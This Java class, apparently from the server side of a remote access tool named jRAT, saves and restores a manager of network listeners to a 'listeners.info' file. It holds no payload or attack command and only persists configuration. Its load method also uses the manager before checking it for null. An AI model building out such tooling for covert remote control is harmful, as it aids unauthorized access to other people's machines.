package net.jrat.core.file.files;

import net.jrat.core.file.File;
import net.jrat.core.listener.Listener;
import net.jrat.core.listener.ListenerManager;

public class FileListener extends File
{
	public FileListener()
	{
		super("listeners.info", true);
	}
	
	@Override
	public void save() throws Exception
	{
		this.clear();
		this.write(this.server.listenerManager);
		this.close();
	}
	
	@Override
	public void load() throws Exception
	{
		final ListenerManager manager = (ListenerManager) this.read(ListenerManager.class);
		
		for(Listener listener : manager.listeners)
			listener.setup();
		
		if(!(manager == null))
			this.server.listenerManager = manager;
	}
}